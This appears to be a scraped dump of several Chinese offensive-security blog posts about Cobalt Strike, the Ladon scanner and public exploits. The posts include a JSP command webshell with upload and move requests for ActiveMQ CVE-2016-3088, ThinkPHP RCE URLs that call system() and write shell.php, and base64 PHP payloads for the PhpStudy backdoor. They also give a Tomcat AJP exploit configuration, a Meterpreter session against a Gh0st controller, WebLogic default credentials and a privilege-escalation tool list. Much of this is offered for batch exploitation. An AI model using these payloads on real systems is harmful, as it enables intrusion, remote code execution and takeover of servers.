欺骗入侵者假设我们在内网中发现别人的CS流量或者抓到样本，给他模拟上线，让他有得看没得吃他在客户端那边只会看到机器在线，就是死活控不了，然后他就想是不是目标环境奇葩还是说网络太卡或有什么问题,能上线就是不能操作，哈哈，一直在上线却啥事也不能做 1234567891011121314import urllib2import time### Cobalt Strike Cheat by K8gegedef cscheat(): opener = urllib2.build_opener() opener.addheaders.append(('Cookie', 'Qk1UsVjTNpW6aR0327yD57Zkt1m6XWurvM+bR0xqOqGnXsatzGHpnccfgqmruH6dnJudEzijQhC0NCtoAxdA90rso7NAfBrfRrktO5B4FjZX6LEBxIyzEwQ71Jk1ttM8VY6luE5k+PMLk6DAmWUoGoJmvAl/qp4qreuWumv52TM=')) res = opener.open(\"http://192.168.1.102:800/dpixel\") content = res.read() print contentwhile True: print(time.strftime('%Y-%m-%d %X',time.localtime())) cscheat() time.sleep(5) 读取CMD指令当客户端下达CMD命令时，中转TeamServer会将命令放在心跳包中，返回的结果如下： 1234^Zd........N...&amp;....%COMSPEC%.... /C net user k8gege..AAAAAAAAAA.&lt;....g..I9.....5e5a69740000002e0000004e000000260000000925434f4d535045432500000013202f43206e65742075736572206b387465616d00004141414141414141414100e488fc2a22f737b0067ac4384c4971 测试多次发现不管执行多长的命令 都会出现/C空格 和两个00加至少一个A所以我们截取 2F4320 和 000041 之间的值，再解密即为CS下发的CMD命令 返回CMD结果将CS的命令执行结果提交到submit.php页面，即可实现回显,数据包如下 123456789101112POST /submit.php?id=60871 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Host: 192.168.1.102:800Content-Length: 68Connection: Keep-AliveCache-Control: no-cache...@...........win-60a3b595b7m\\k8gege................0=W1..LGCN.. 结语通过本文我们了解了CS心跳包机制、下达指令、回显等原理，并玩弄入侵者有兴趣的话，可以自行抓包实现自己的CS服务端，甚至支持对Linux的控制也可以实现CS远控的密罐，把CS下达的指令提取出来，返回假的CMD命令结果即能收集目标证据以及意图，还能将他玩弄于鼓掌之中，搞死他，哈哈 PS：之所以有这篇文章，是因为昨晚有人在群里讨论，CS能不能支不支持Linux目前CS的shellcode以及beacon(核心功能DLL)都是WINDOWS系统才能执行。而CS对于Linux的控制目前仅是SSH会话，想真正支持就得自己实现服务端不要说让其支持Linux，用个GO来实现，兼容全平台都可以，只是很麻烦因为不开源，每一个动作都要自己去分析它的数据包，很多功能也很费时其实早在去年的这个时间就想实现Linux服务端，所以抓包研究了下。当时就应该有这篇文章了，只是因为忙，懒得编辑文字，后面忘了发。","categories":[{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/categories/CS/"}],"tags":[{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/tags/CS/"},{"name":"Python","slug":"Python","permalink":"http://k8gege.org/tags/Python/"}]},{"title":"Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞","slug":"Ladon CVE-2020-1938","date":"2020-03-28T03:39:45.663Z","updated":"2020-03-30T03:04:56.043Z","comments":true,"path":"p/42879.html","link":"","permalink":"http://k8gege.org/p/42879.html","excerpt":"","text":"漏洞信息根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。 漏洞编号cnvd-2020-10487cve-2020-1938 漏洞条件开放AJP端口（默认开放8009） 漏洞版本apache tomcat 6apache tomcat 7 &lt; 7.0.100apache tomcat 8 &lt; 8.5.51apache tomcat 9 &lt; 9.0.31 扫描框架Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单 Ladon配置INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式 EXE配置cve-2020-1938.ini 123[Ladon]exe=CVE-2020-1938.exearg=-p 8009 -f /WEB-INF/web.xml $ip$ -c 0 PY配置cve-2020-1938.ini 123[Ladon]exe=f:\\python\\python.exearg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml $ip$ -c 0 批量内网把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段 1Ladon cve-2020-1938.ini 以下为内网实战批量检测结果 文件包含RCE一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami 1&lt;%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"whoami\").getInputStream())).readLine());%&gt; 1234python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1Getting resource at ajp13://192.168.1.10:8009/index.jsp----------------------------k82003-77562e10\\administrator 漏洞修复1.更新到安全版本Apache Tomcat 7.0.100Apache Tomcat 8.5.51Apache Tomcat 9.0.31 2.关闭AJP服务修改Tomcat配置文件Service.xml,注释掉 3、配置ajp配置配置ajp配置中的secretRequired跟secret属性来限制认证 下载https://github.com/k8gege/Ladon","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"}]},{"title":"利用DirectoryEntry获取域内计算机以及共享资源","slug":"Ladon EnumShare","date":"2020-03-28T03:39:45.663Z","updated":"2020-06-06T02:29:20.876Z","comments":true,"path":"p/54132.html","link":"","permalink":"http://k8gege.org/p/54132.html","excerpt":"","text":"前言System.DirectoryServices.DirectoryEntry组件提供了对Active Directory的访问。本文以两个简单的小程序为例，阐述了如何利用此组件查看网络的各节点的信息。 DirectoryEntry组件提供了Path属性，根据文档，此属性指定了目录服务中用来访问对象的对象名，其格式如下：protocol://servername:port number/distinguished name此语句的第一部分定义了访问将使用的协议，如LDAP: (Lightweight Directory Access Protocol)IIS: (提供IIS元数据来读及配置Internet Infomation Server)WinNT: (提供在非常有限的性能下对Windows NT域的访问)NDS: (提供对Novell Directory Service的访问)等等（详细信息清参考MSDN）。 因此我们构造一个DirectoryEntry实例，将它的Path设为”WinNT:”，以通过对它的所有子项的枚举来发现网络上的所有域（以及工作组）。这样，再对所发现的域（以及工作组）的子项进行枚举，就可以发现网络上的所有计算机，结合WMI发现机器上的共享资源。 C#实现代码以下为Ladon的EnumShare代码,自动获取当前域，并枚举域内计算机以及获取机器开放共享资源。 12345678910111213141516171819202122232425string strDomain;string strComputer;string strShare;Console.WriteLine(&quot;Load EnumShare&quot;);DirectoryEntry root &#x3D; new DirectoryEntry(&quot;WinNT:&quot;);foreach (DirectoryEntry Domain in root.Children)&#123; strDomain &#x3D; Domain.Name; Console.WriteLine(&quot;Domain: &quot; + strDomain); foreach (DirectoryEntry Computer in Domain.Children) &#123; if (Computer.SchemaClassName.Equals(&quot;Computer&quot;)) &#123; strComputer &#x3D; Computer.Name; ManagementObjectSearcher searcher &#x3D; new ManagementObjectSearcher(&quot;select * from win32_share&quot;); foreach (ManagementObject share in searcher.Get()) &#123; strShare &#x3D; share[&quot;Name&quot;].ToString(); Console.WriteLine(strComputer + &quot;\\\\&quot; + strShare); &#125; &#125; &#125;&#125; Ladon EnumShare因为崇尚极简主义，所以Ladon无需填写域名以及参数，参数多也很烦，全自动获取，一步到位。 参考https://github.com/k8gege/Ladon https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/categories/Dotnet/"},{"name":"内网渗透","slug":"Lan-Pentest","permalink":"http://k8gege.org/categories/Lan-Pentest/"},{"name":"源码","slug":"Code","permalink":"http://k8gege.org/categories/Code/"},{"name":"主机发现","slug":"OnlinePC","permalink":"http://k8gege.org/categories/OnlinePC/"},{"name":"信息收集","slug":"Discover","permalink":"http://k8gege.org/categories/Discover/"},{"name":"编程","slug":"Program","permalink":"http://k8gege.org/categories/Program/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/tags/Dotnet/"}]},{"title":"利用Gh0st 3.6远程溢出漏洞反向控制攻击者","slug":"Gh0st 3.6 beat Overflow MSF","date":"2020-01-12T10:30:10.000Z","updated":"2020-01-12T11:52:45.803Z","comments":true,"path":"p/30568.html","link":"","permalink":"http://k8gege.org/p/30568.html","excerpt":"","text":"前言漏洞验证在2017年被公开，实际上Gh0st溢出漏洞在2009年时就已被人爆出过多个可见使用开源C2工具，不见得安全，最好是经过二次修改，单纯做免杀可防不了哦 MSFTeston WinXP at 2017-09-15运行Gh0st客户端，然后通过MSF溢出C2客户端机器，即可反向获取攻击者机器权限 12345678910111213141516171819202122msf &gt; use exploit/windows/misc/gh0stmsf exploit(gh0st) &gt; set RHOST 192.168.1.126RHOST =&gt; 192.168.1.126msf exploit(gh0st) &gt; run[*] Started reverse TCP handler on 192.168.1.125:4444 [*] 192.168.1.126:80 - Trying target Gh0st Beta 3.6[*] 192.168.1.126:80 - Spraying heap...[*] 192.168.1.126:80 - Trying command 103...[*] Sending stage (957999 bytes) to 192.168.1.126[*] Meterpreter session 1 opened (192.168.1.125:4444 -&gt; 192.168.1.126:1070) at 2017-09-15 16:22:56 +0800[*] 192.168.1.126:80 - Server closed connectionmeterpreter &gt; sysinfoComputer : K8ANTI-B2B9B81COS : Windows XP (Build 2600, Service Pack 3).Architecture : x86System Language : zh_CNDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/windowsmeterpreter &gt; EXPhttps://github.com/rapid7/metasploit-framework/blob/be66ed8af3c355b1280e1a2bdbe5dd1a74e7bc58/modules/exploits/windows/misc/gh0st.rb https://github.com/rapid7/metasploit-framework/files/1243297/0efd83a87d2f5359fae051517fdf4eed8972883507fbd3b5145c3757f085d14c.zip","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/categories/Metasploit/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/tags/Metasploit/"},{"name":"Overflow","slug":"Overflow","permalink":"http://k8gege.org/tags/Overflow/"},{"name":"Gh0st","slug":"Gh0st","permalink":"http://k8gege.org/tags/Gh0st/"}]},{"title":".NET版“ShellCode”编写","slug":"Opcode操作码.NET版Shellcode","date":"2020-01-11T07:10:10.000Z","updated":"2020-01-18T11:48:26.936Z","comments":true,"path":"p/40249.html","link":"","permalink":"http://k8gege.org/p/40249.html","excerpt":"","text":"0x000 前言近几年大家都喜欢用CS来进行后渗透，所以对于ShellCode大家应该不会陌生。但是可能很多人并不懂CS它的功能是什么,CS生成的ShellCode是一段下载者。主要功能为下载becon.dll，然后内存加载，我们所用的相关功能都在becon里。ShellCode可能采用汇编或VC编写后转成机器码提取关键机器码，优势在于体积小体积小就可以直接结合漏洞使用，什么Word文档、MS17010溢出、IE漏洞挂马等都可以直接结合CS来使用，直接CS上线，而不是非要先做其它操作再植入CS。网上关于汇编或VC编写ShellCode的文章很多，但是.NET的”ShellCode”很少见本文将教大家如何用操作码实现.NET版”ShellCode”的编写。 0x001 指令、操作码、字节码在正式开始前，先给大家科普一下指令、操作码、机器码等的区别 指令: 命令cpu干什么,是由操作码字段和地址码字段(操作数字段)组成 操作码(Opcode): 就是执行某种操作的命令代码 BYTECODE(字节码）：与机器代码相同,除了它主要由基于软件的解释器(如Java或CLR)使用 程序集：有两个“程序集” – 一个汇编程序是一系列的助记符和操作数,它们被馈送到“汇编程序”,“汇编程序”将助记符和操作数“汇编成可执行的机器代码”.可选地,“链接器”链接组件并生成可执行文件. CLR语言：(.NET语言)中的第二个“程序集”是一系列CLR代码,其中注入了元数据信息,可执行代码库,但不能直接执行. 0x002 Payload ShellCode机器码(溢出常用的ShellCode): 就是指令的二进制代码(包括操作码和地址码)，功能打开和关闭计算机中的开关的数字序列,以执行某些工作 – 例如增加数字,分支,乘法等等.这是纯机器特有的,由处理器的实现者. K8理解的ShellCode是子弹，用枪发射(好比处理器执行); 无论你用的是哪种子弹(ShellCode)，都是用枪来射(处理器执行)。 Payload: K8的理解是弹药，弹药可装填到弹壳里用，也可直接点然，也可圈起来当成炮仗点燃，但是弹药不能直接被枪发射。 PS：发现很多搞安全的对很多概念搞混，如很多文章常把payload和shellcode混为一谈看了以上释义，您应该了解明显shellcode只是payload中的一种了，不可能属于同一个。很多人把操作码误解为ShellCode还可以理解，起码长得像还有点类似，但真不是。不要看到二进制、16进制或者byte数组就说是shellcode，长得像人都不定是人呢。 0x003 .NET函数代码.NET包含多种语言，这里我使用C#的代码做为例子 12345public int Add(int x, int y)&#123; x &#x3D; x * y; return x + y;&#125; 0x003 反汇编得到IL指令指令速查表：https://www.jb51.net/article/86802.htmIL语言，可理解为.NET的汇编,无论你使用的是C#还是VB.NET或者F#开发功能，都可以将其反编译成IL代码。使用ildasm.exe工具反编译，可以看到IL代码和汇编差不多，可能是常用.NET吧，感觉比汇编简单好多。 123456789101112 &#x2F;&#x2F; Method begins at RVA 0x2170 &#x2F;&#x2F; Code size 9 (0x9) .maxstack 8 IL_0000: &#x2F;* 03 | *&#x2F; ldarg.1 IL_0001: &#x2F;* 04 | *&#x2F; ldarg.2 IL_0002: &#x2F;* 5A | *&#x2F; mul IL_0003: &#x2F;* 10 | 01 *&#x2F; starg.s x IL_0005: &#x2F;* 03 | *&#x2F; ldarg.1 IL_0006: &#x2F;* 04 | *&#x2F; ldarg.2 IL_0007: &#x2F;* 58 | *&#x2F; add IL_0008: &#x2F;* 2A | *&#x2F; ret&#125; &#x2F;&#x2F; end of method MethodBodyDemo::Add 0x004 IL指令转.NET操作码如同VC反汇编提取机器码一样，我们将对应16进制复制出来，然后再对比指令速查表提取关键操作码 10x02,0x03,0x5A,0x10,0x00,0x02,0x03,0x58,0x2A 0x005 操作码加载123456789101112131415private static Func&lt;int, int, int&gt; LoadByteAssmbly(byte[] bytes) &#123; var asmName &#x3D; new AssemblyName(&quot;DynamicAssembly&quot;); var asmBuilder &#x3D; AppDomain.CurrentDomain.DefineDynamicAssembly(asmName, AssemblyBuilderAccess.RunAndSave); var module &#x3D; asmBuilder.DefineDynamicModule(&quot;DynamicModule&quot;); var typeBuilder &#x3D; module.DefineType(&quot;DynamicType&quot;); var method &#x3D; typeBuilder.DefineMethod(&quot;DynamicMethod&quot;, MethodAttributes.Public | MethodAttributes.Static, typeof(int), new[] &#123; typeof(int), typeof(int) &#125;); method.CreateMethodBody(bytes, bytes.Length); var type &#x3D; typeBuilder.CreateType(); return (Func&lt;int, int, int&gt;)type.GetMethod(&quot;DynamicMethod&quot;).CreateDelegate(typeof(Func&lt;int, int, int&gt;)); &#125; 0x006 执行效果","categories":[{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/categories/Dotnet/"},{"name":"ShellCode","slug":"ShellCode","permalink":"http://k8gege.org/categories/ShellCode/"},{"name":"源码","slug":"Code","permalink":"http://k8gege.org/categories/Code/"},{"name":"编程","slug":"Program","permalink":"http://k8gege.org/categories/Program/"}],"tags":[{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/tags/Dotnet/"},{"name":"ShellCode","slug":"ShellCode","permalink":"http://k8gege.org/tags/ShellCode/"},{"name":"OpCode","slug":"OpCode","permalink":"http://k8gege.org/tags/OpCode/"}]},{"title":"Oracle WebLogic 默认密码表","slug":"oracle weblogic default passwold","date":"2020-01-11T06:00:10.000Z","updated":"2020-01-11T08:02:23.143Z","comments":true,"path":"p/30603.html","link":"","permalink":"http://k8gege.org/p/30603.html","excerpt":"","text":"Oracle - WebLogicMethod HTTPUser ID systemPassword passwordLevel Administrator Notes Login located at /console Oracle - WebLogicMethod HTTPUser ID weblogicPassword weblogicLevel Administrator Notes Login located at /console Oracle - WebLogicVersion 9.0 Beta (Diablo)User ID weblogicPassword weblogic Oracle - WebLogic Process IntegratorVersion 2.0User ID adminPassword security Oracle - WebLogic Process IntegratorVersion 2.0User ID joePassword password Oracle - WebLogic Process IntegratorVersion 2.0User ID maryPassword password Oracle - WebLogic Process IntegratorVersion 2.0User ID systemPassword security Oracle - WebLogic Process IntegratorVersion 2.0User ID wlcsystemPassword wlcsystem Oracle - WebLogic Process IntegratorVersion 2.0User ID wlpisystemPassword wlpisystem","categories":[{"name":"密码","slug":"Pass","permalink":"http://k8gege.org/categories/Pass/"}],"tags":[{"name":"Brute","slug":"Brute","permalink":"http://k8gege.org/tags/Brute/"},{"name":"Password","slug":"Password","permalink":"http://k8gege.org/tags/Password/"}]},{"title":"CVE-2016-3088 ActiveMQ GetShell Exploit","slug":"Ladon activemq exp","date":"2020-01-11T05:30:10.000Z","updated":"2020-01-11T08:28:57.155Z","comments":true,"path":"p/12105.html","link":"","permalink":"http://k8gege.org/p/12105.html","excerpt":"","text":"前言使用Exp生成器生成Ladon插件实战，CVE-2016-3088 ActiveMQ GetShell 0x000 漏洞信息漏洞编号: CVE-2016-3088漏洞原理: ActiveMQ 中的 FileServer 服务允许用户通过 PUT/MOVE方法上传文件到指定目录影响版本: Apache ActiveMQ 5.0.0 – 5.13.2 0x001 获取路径PUT /fileserver/%20/%20 0x002 上传shell上传和移动文件需登陆,默认帐密admin/admin,将以下代码双引号进行转义(原本是转义好的被github过滤了)PUTAddUrl: /fileserver/cmd.jspPUTData: &lt;%@ page import=&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&quot;);String strcmd = request.getParameter(&quot;cmd&quot;);String line =null;Process p=Runtime.getRuntime().exec(strcmd);InputStream is = p.getInputStream();BufferedReader br = new BufferedReader(new InputStreamReader(is));while((line =br.readLine())!=null){out.print(line+&quot;&quot;);}%&gt;Authorization: admin:admin 0x003 移动shell根目录和fileserver均不解析JSP文件,好在admin和api目录可以解析MOVEAddUrl: /fileserver/cmd.jspDestination: file://C:/Users/null/Desktop/apache-activemq-5.9.0/webapps/admin/cmd.jsp 0x004 Cscan调用 0x005 连接shell访问http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami 0x006 视频教程Video1: K8Cscan Apache ActiveMQ GetShell CVE-2016-3088Video2: WhatCMS指纹识别内网ActiveMQ&amp;GetShell","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"},{"name":"ActiveMQ","slug":"ActiveMQ","permalink":"http://k8gege.org/tags/ActiveMQ/"},{"name":"CVE-2016-3088","slug":"CVE-2016-3088","permalink":"http://k8gege.org/tags/CVE-2016-3088/"}]},{"title":"ThinkPHP 5.0.22 5.1.29 GetShell Exploit","slug":"Ladon thinkphp exp","date":"2020-01-11T05:20:10.000Z","updated":"2020-01-11T08:03:12.392Z","comments":true,"path":"p/26286.html","link":"","permalink":"http://k8gege.org/p/26286.html","excerpt":"","text":"前言使用Exp生成器生成Ladon插件实战，ThinkPHP GetShell 漏洞环境使用docker ThinkPHP 5.0.20 复现测试Payload:http://192.168.1.37:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 执行命令http://192.168.1.37:8080/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami 写入文件GetShell1http://192.168.1.37:8080/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo 111111&gt;shell.phpGetShell2/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=URL编码内容 视频教程通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程Video: K8Cscan ThinkPHP 5.x RCE Exploit","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://k8gege.org/tags/ThinkPHP/"}]},{"title":"Ladon Weblogic CVE-2018-2894","slug":"ladon weblogic cve-2018-2894","date":"2020-01-11T05:00:10.000Z","updated":"2020-01-11T14:25:59.551Z","comments":true,"path":"p/28875.html","link":"","permalink":"http://k8gege.org/p/28875.html","excerpt":"","text":"前言使用Exp生成器生成Ladon插件实战,Weblogic CVE-2018-2894漏洞检测 漏洞扫描 Weblogic CVE-2018-2894github上有一份weblogic一键检测脚本，发现存在漏洞误报看了下代码竟只是判断页面非404，对于返回403,500等误报还不如写成200，虽然同样不靠谱，于是Ladon添加此POC检测 误报的POC检测脚本 存在漏洞的页面特征 EXP生成器生成POC使用EXP生成器可简单检测，至少判断页面特征比单纯检测状态更好吧 POC测试LadonExp生成的POC可单独使用，也可作为Ladon插件批量检测单独使用: CVE-2018-2894_Poc.exe url批量使用: Ladon CVE-2018-2894_Poc.exe (根目录url.txt)当然Ladon内置模块WeblogicPoc已添加该漏洞检测","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"},{"name":"PhpStudy","slug":"PhpStudy","permalink":"http://k8gege.org/tags/PhpStudy/"}]},{"title":"PhpStudy BackDoor GetShell","slug":"ladon phpstudy","date":"2020-01-11T04:00:10.000Z","updated":"2020-01-11T08:34:16.271Z","comments":true,"path":"p/36010.html","link":"","permalink":"http://k8gege.org/p/36010.html","excerpt":"","text":"前言使用Exp生成器生成Ladon插件实战,PhpStudy BackDoor GetShell 简介Cscan Web Exp生成器包含4种提交方法Get/Post/Put/Move,支持16个Http协议参数。用户无需编程能力，填写HTTP参数即可生成Web漏洞POC，快速扩展Cscan扫描能力。 运行环境运行环境：.net 3.5(Win7自带)将生成器和Ladon.exe放在同一目录 PhpStudy后门为例该后门利用比较简单，仅需提交两个参数Accept-Encoding: gzip,deflateAccept-Charset: Base64编码(PHP代码)https://github.com/k8gege/PhpStudyDoor 0x001 测试POC打印字符串echo “ISDoorOK”;K8飞刀Base64编码得到 ZWNobyAiSVNEb29yT0siOw==如包含 ISDoorOK ,返回PhpStudyDoor 配置Accept-Encoding: gzip,deflateAccept-Charset: ZWNobyAiSVNEb29yT0siOw== PocTag: ISDoorOKPocName: PhpStudyDoor 编译测试Cscan 5.2By K8gegeload netscan.dllhttp://192.168.1.26 PhpStudyDoorFinished! 0x002 利用EXP执行whoami命令(可根据需要改成GetShell或反弹)echo ‘start’;system(‘whoami’);echo ‘end’; 配置Accept-Encoding: gzip,deflateAccept-Charset: ZWNobyAnc3RhcnQnO3N5c3RlbSgnd2hvYW1pJyk7ZWNobyAnZW5kJzs= 编译测试Cscan 5.2By K8gegeload netscan.dllstartwin-4udh62v7dmn\\nullendHello WorldFinished! 0x003 结果提取Result勾选替换换行为空格正则: (?&lt;=start).*?(?=end) 0x004 批量利用为了不被后续Exp覆盖,可将netscan.dll改名为PhpStudyExp.dll单个IP检测 Cscan 192.168.1.8 PhpStudyExp.dll单个URL检测Cscan http://192.168.1.8 PhpStudyExp.dll批量C段检测 Cscan 192.168.1.8/24 PhpStudyExp.dll批量B段检测 Cscan 192.168.1.8/16 PhpStudyExp.dll批量url.txt检测 Cscan PhpStudyExp.dll执行结果返回机器IP以及利用结果(执行whoami当前用户) 0x005 下载https://github.com/k8gege/K8CScan/tree/master/ExpGenerator","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"},{"name":"PhpStudy","slug":"PhpStudy","permalink":"http://k8gege.org/tags/PhpStudy/"}]},{"title":"K8tools工具合集20200118","slug":"K8tools工具合集","date":"2019-12-27T13:30:00.000Z","updated":"2020-03-30T04:52:56.802Z","comments":true,"path":"p/72f1fea6.html","link":"","permalink":"http://k8gege.org/p/72f1fea6.html","excerpt":"","text":"声明: 工具仅供安全研究或授权渗透，非法用途后果自负。 下载: https://github.com/k8gege/K8tools PS: 不定期更新,文件比较大，可按需下载。工具有BUG或建议可直接Github上留言提权工具均可在远控Cmd或WebShell运行，大部份经过修改编译兼容性稳定性更好注意：不保证永久有效,喜欢自行保存。 综合工具 [+] 扫描工具 Ladon 5.7 大型内网渗透扫描神器内置40个功能,支持Cobalt Strike [+] 扫描工具 K8Cscan5.4 大型内网渗透扫描器内置30个功能,支持Cobalt Strike [+] 综合工具 K8飞刀Final.rar [+] K8data.mdb K8飞刀漏洞数据库20190402 [+] K8expList.txt K8飞刀漏洞利用列表 提权工具 [+] 提权工具 CVE-2019-0803.exe Win32k漏洞提权工具 [+] 提权工具 iislpe.exe IIS全版本提权(仅限IIS帐户、服务帐户) [+] 提权工具 pr.exe pr有参版 pr0无参版（巴西烤肉:国内10年所说的PR或IIS6提权） [+] 提权工具 k8uac_20181125[K8].rar 目前还支持全版本WIN7-Win10 [+] 提权工具 bypassUAC_Win7_10[K8team].rar 13还是15年？Win10打补丁失效 [+] 提权工具 bypassUACexe_0419[K8].rar 13年的吧 打补丁的WIN7好像不支持了 [+] 提权工具 Lpk提权_K8.rar DLLHijack [+] 提权工具 Usp10提权_K8.rar DLLHijack [+] 提权工具 MS11-046.exe [+] 提权工具 MS11-080.exe [+] 提权工具 MS14-068 EXP域内提权神器.rar [+] 提权工具 MS15-010提权[K8team]_20150603.rar [+] 提权工具 MS15-051提权 CVE-2015-1701_20150525[K8].rar [+] 提权工具 MS15-077提权工具[K8].rar [+] 提权工具 MS16-016提权EXP[K8].rar [+] 提权工具 Windows Win32k.sys EPATHOBJ 0day Exploit 提权工具 [K8team].rar [+] 提权工具 k8downexec.mof [+] 提权工具 k8zzz.rar SMB溢出 支持执行自定义exe程序 [+] 提权工具 udf.dll MYSQL udf提权DLL [+] 提权工具 ws2help提权_K8.rar [+] 提权工具 卡巴6.0.2.614提权.exe [+] 提权工具 小红伞 Avira avipbb.sys 提权Exploit_1024[K8].rar [+] 提权工具 提权Admin2SystemRun_0419[K8].rar [+] 提权工具 提权GetTrustedInstaller_0419[K8].rar [+] 提权工具 降权System2AdminRun_0419[K8].rar [+] 提权工具 无NET添加用户提权_20140511[K8].rar [+] 提权工具 K8_VBS提权脚本免杀生成器.rar [+] 进程注入 DLL注入进程工具过UAC [+] 提权工具 NV显卡提权NVexploit.rar [+] 提权工具 net2.0day.exe [+] 提权工具 K8dllhijack.rar DLL却持测试工具 [+] 提权工具 Invoke-MS16-032.ps1 [+] Apache 2.2.1.4 mod_isapi exploit.rar 漏洞利用 [+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz） [+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005) [+] 漏洞检测 Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix) [+] 漏洞利用 cve-2019-0604 SharePoint RCE exploit [+] 漏洞利用 K8_JbossExp.exe Jboss Jmx-console exploit [+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell 